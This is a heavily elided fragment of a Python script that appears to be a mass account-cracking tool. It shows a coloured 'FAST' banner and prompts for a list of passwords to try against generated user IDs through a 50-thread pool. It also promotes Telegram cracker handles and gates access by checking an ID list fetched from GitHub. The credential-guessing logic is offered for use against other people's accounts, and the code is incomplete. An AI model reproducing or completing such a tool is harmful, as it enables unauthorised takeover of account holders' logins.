...
today = date.today()
logo =                                          ("""
\033[1;91m ______   ______     ______     ______  
\033[1;91m/\  ___\ /\  __ \   /\  ___\   /\__  _\ 
\033[1;97m\ \  __\ \ \  __ \  \ \___  \  \/_/\ \/ 
\033[1;32m \ \_\    \ \_\ \_\  \/\_____\    \ \_\ 
\033[1;32m  \/_/     \/_/\/_/   \/_____/     \/_/ 
...
def i():
    ...
    os.system("clear")
    print(logo)
    passx = int(input("[°|°] CHAND PASS DADANEY : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[°|°] PASSWORD DABNE : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;98m JOIN CHANALL BKAN @craker1207')
        print('\033[1;99m BO KREN NAMA BNERA @virat1209')
        print('\033[1;32m#################################')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
...
def ID():
    ...
    if id in requests.get("https://raw.githubusercontent.com/ViratUp/Virat1209/main/Id%20ACTIVE.txt").text:
